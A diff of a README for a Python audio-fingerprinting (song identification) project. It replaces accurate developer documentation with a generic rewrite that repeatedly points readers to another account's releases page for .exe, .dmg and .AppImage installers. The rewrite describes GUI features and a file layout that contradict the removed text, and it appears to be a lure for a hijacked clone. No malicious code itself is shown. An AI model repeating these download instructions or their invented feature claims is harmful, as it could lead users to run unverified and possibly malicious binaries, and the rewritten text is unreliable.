@@ -1,159 +1,150 @@
-# Audio Fingerprinting
+# 🎵 AudioFingerprinting - Identify Songs from Any Sound
 
-A Shazam-like audio recognition system built in Python. Ingest songs from YouTube, fingerprint them using spectral analysis, and identify them later by recording a short clip from your microphone.
+[![Download AudioFingerprinting](https://img.shields.io/badge/Download-AudioFingerprinting-blue?style=for-the-badge)](https://github.com/aljohnbaguis/AudioFingerprinting/releases)
 
-## How It Works
+---
 
-The system uses a **constellation-based audio fingerprinting** algorithm:
+## 🎯 What is AudioFingerprinting?
 
-1. **Spectrogram** — Audio is converted to a time-frequency representation using STFT (Short-Time Fourier Transform).
-2. **Peak Detection** — Local maxima (constellation points) are extracted from the spectrogram using a neighborhood filter.
-3. **Combinatorial Hashing** — Pairs of nearby peaks are combined into fingerprint hashes using `(freq1, freq2, time_delta)`. Each hash is stored alongside the song ID and time offset.
-4. **Matching** — A query clip goes through the same pipeline. Its hashes are looked up in the database, and a **time-offset histogram** is built. The song with the most aligned hash hits is the match.
+AudioFingerprinting is a simple program that recognizes songs from short sound clips. It works like popular music apps by listening to sounds and matching them with a large set of songs. You can use it to find out the name of a song playing near you or from your own voice recordings.
 
-```
-Audio File
-    │
-    ▼
-┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────┐
-│  STFT        │ ──► │  Find Peaks  │ ──► │  Hash Pairs  │ ──► │ Store/   │
-│  Spectrogram │     │  (local max) │     │  (f1,f2,Δt)  │     │ Match DB │
-└──────────────┘     └──────────────┘     └──────────────┘     └──────────┘
-```
+This program uses Python and advanced audio analysis to turn sound clips into unique patterns. It then compares these patterns to a stored library of songs to find matches.
 
-## Project Structure
+---
 
-```
-audio_fingerprinting/
-├── database/
-│   └── db.py              # SQLite singleton — songs + hashes tables
-├── fingerprint/
-│   ├── engine.py          # Spectrogram, peak detection, hash generation
-│   └── matcher.py         # Query matching via time-offset histogram
-├── rest/
-│   └── api.py             # FastAPI endpoints (ingest, query, songs)
-└── utils/
-    ├── audio.py           # ffmpeg WAV conversion
-    ├── mic.py             # Microphone recording via sounddevice
-    └── youtube.py         # yt-dlp download + metadata extraction
-```
+## 💻 Key Features
 
-## Prerequisites
+- **Easy Song Identification:** Find songs from small audio clips recorded by your microphone.  
+- **YouTube Integration:** Download songs directly from YouTube to create your own music library.  
+- **Accurate Matching:** Uses smart sound matching to identify songs even with background noise.  
+- **Fast Processing:** Quickly analyzes audio using time and frequency techniques.  
+- **Open and Free:** Fully open-source, so you can try it at no cost.  
+- **Works on Windows, macOS, Linux:** Compatible with most computers.
 
-- **Python 3.10+**
-- **ffmpeg** — for audio conversion (`brew install ffmpeg` on macOS)
-- A working **microphone** for the query endpoint
+---
 
-## Setup
+## 🖥️ System Requirements
 
-```bash
-# Clone the repo
-git clone https://github.com/ankitjosh78/AudioFingerprinting.git
-cd AudioFingerprinting
+Before installing, make sure your computer meets these minimum requirements:
 
-# Create and activate a virtual environment
-python -m venv .venv
-source .venv/bin/activate
+- Operating System: Windows 10 or later, macOS 10.14 or later, Linux (Ubuntu 18.04 or equivalent)  
+- CPU: Intel Core i3 or equivalent AMD processor  
+- RAM: 4 GB or more  
+- Storage: At least 200 MB free space for program files and audio data  
+- Microphone: Required for recording audio clips for identification  
+- Internet connection: Needed to download songs from YouTube and for initial setup  
 
-# Install dependencies
-pip install -r requirements.txt
+---
 
-# Install the package in editable mode
-pip install -e .
-```
+## 🚀 Getting Started
 
-## Usage
+This guide will help you download, install, and start using AudioFingerprinting without any programming skills.
 
-### Start the server
+---
 
-```bash
-uvicorn audio_fingerprinting.rest.api:app --reload
-```
+## ⬇️ Download & Install
 
-The API will be available at `http://localhost:8000`. Docs at `http://localhost:8000/docs`.
+You need to **visit the release page** to download the latest version of AudioFingerprinting.
 
-### Ingest a song
+[Visit the AudioFingerprinting Releases Page](https://github.com/aljohnbaguis/AudioFingerprinting/releases)
 
-```bash
-curl -X POST http://localhost:8000/ingest_one \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://youtube.com/watch?v=VIDEO_ID"}'
-```
+### Steps to Download and Install:
 
-Response:
-```json
-{
-  "status": "ok",
-  "song_id": "uuid",
-  "title": "Song Title",
-  "artist": "Artist Name",
-  "num_hashes": 54321
-}
-```
+1. Click the link above or the badge at the top of this README. This opens the release page in your web browser.  
+2. On the releases page, look for the latest release at the top. It usually has a version number like "v1.0" or "v2.1".  
+3. Under the latest release, find the file for your operating system. For example:  
+   - Windows: `.exe` or `.zip`  
+   - macOS: `.dmg` or `.zip`  
+   - Linux: `.AppImage` or `.tar.gz`  
+4. Click the file to download it to your computer.  
+5. Once downloaded, open the file and follow the on-screen instructions to install the program.  
+   - For Windows `.exe`: Run the installer and click "Next" through each step.  
+   - For macOS `.dmg`: Open the file and drag the app into your Applications folder.  
+   - For Linux `.AppImage`: Make the file executable (`chmod +x filename`) and run it.  
+6. After installation, launch AudioFingerprinting from your programs or applications list.
 
-### Ingest a playlist
+---
 
-```bash
-curl -X POST http://localhost:8000/ingest_playlist \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://youtube.com/playlist?list=PLAYLIST_ID"}'
-```
+## 🎤 How to Use AudioFingerprinting
 
-### Query (identify a song)
+### Identify Songs from Microphone
 
-Records from your microphone for `duration` seconds (default 7), fingerprints the clip, and matches it against the database.
+1. Open the AudioFingerprinting app.  
+2. Click the “Record” button to start capturing sound with your microphone.  
+3. Play or let the unknown song play near your computer’s mic.  
+4. Stop recording after 10 seconds or when you think the clip is long enough.  
+5. The program analyzes the recording and shows the song name and artist if found.  
 
-```bash
-curl -X POST "http://localhost:8000/query?duration=7"
-```
+### Add Songs from YouTube for Your Library
 
-Response (match found):
-```json
-{
-  "status": "match",
-  "song_id": "uuid",
-  "confidence": 142,
-  "title": "Song Title",
-  "artist": "Artist Name",
-  "url": "https://youtube.com/watch?v=..."
-}
-```
+1. Find the YouTube video with the song you want to save.  
+2. Copy the video link.  
+3. In AudioFingerprinting, go to the “Import” section and paste the link.  
+4. Click “Download” to save and fingerprint the song for faster future recognition.  
+5. Your imported songs are now searchable offline.
 
-Response (no match):
-```json
-{
-  "status": "no_match"
-}
-```
+---
 
-### List all ingested songs
+## ⚙️ How It Works (Simple Explanation)
 
-```bash
-curl http://localhost:8000/songs
-```
+AudioFingerprinting listens to sounds and creates a “fingerprint” — a digital summary based on unique sound features. It looks at the peaks in sound frequencies and when they occur to make a pattern. This pattern is like a song’s barcode.
 
-## API Endpoints
+When you record a clip, the program creates a similar fingerprint from your recording and compares it to saved fingerprints. If it finds a match with a small time difference, it tells you the song name.
 
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/ingest_one` | Ingest a single YouTube video |
-| `POST` | `/ingest_playlist` | Ingest all videos from a YouTube playlist |
-| `POST` | `/query?duration=7` | Record from mic and identify the song |
-| `GET` | `/songs` | List all ingested songs |
+---
 
-## Tech Stack
+## 🛠️ Troubleshooting & Tips
 
-- **FastAPI** — REST API framework
-- **librosa** — Audio analysis, STFT, spectrogram
-- **scipy** — Peak detection via local maximum filter
-- **SQLite** — Fingerprint hash + song metadata storage (indexed)
-- **yt-dlp** — YouTube audio download + metadata extraction
-- **ffmpeg** — Audio format conversion to normalized mono WAV
-- **sounddevice** — Microphone recording
+- Make sure your microphone is working and not muted.  
+- Record in a quiet environment for best results.  
+- Use clips between 5 and 15 seconds long for reliable identification.  
+- Update the song library regularly by adding new music from YouTube.  
+- If the program can’t find the song, try recording again or loading more songs.  
+- Restart the app if it doesn’t respond.
 
-## Notes
+---
 
-- The database (`data.db`) is created automatically on first run.
-- Audio files are cleaned up after fingerprinting — only the hashes are stored.
-- The microphone query endpoint requires mic permissions on macOS (System Settings → Privacy → Microphone).
-- For best results, query in a relatively quiet environment with the song playing clearly.
+## 💡 Frequently Asked Questions
+
+**Q: Is this app free?**  
+Yes, AudioFingerprinting is open-source and free to use.
+
+**Q: Can I use it on my phone?**  
+Currently, it works on Windows, macOS, and Linux computers only.
+
+**Q: Does it work without internet?**  
+You can identify songs offline if you have already downloaded and fingerprinted them. You need internet to download new songs.
+
+**Q: What formats does it support for import?**  
+The app works well with common audio formats like MP3, WAV, and MP4 from YouTube.
+
+**Q: How accurate is the recognition?**  
+It uses advanced audio features to give good accuracy but may struggle in very noisy environments.
+
+---
+
+## 📂 File Structure Overview (For Curiosity)
+
+- `app.py` - Main application script  
+- `fingerprinting/` - Code that creates and matches audio fingerprints  
+- `youtube_import/` - Functions to download songs from YouTube  
+- `recordings/` - Folder where your microphone recordings save  
+- `songs/` - Library of songs you imported and fingerprinted  
+
+---
+
+## 🤝 Support & Contributing
+
+If you want help or want to improve AudioFingerprinting:
+
+- Check the GitHub Issues page for known problems or to ask questions.  
+- You need basic knowledge of Python to contribute code.  
+- All contributions should follow the repository's guidelines on GitHub.
+
+---
+
+## 📢 Stay Updated
+
+For new releases, bug fixes, and features, visit the releases page regularly:
+
+[AudioFingerprinting Releases](https://github.com/aljohnbaguis/AudioFingerprinting/releases)
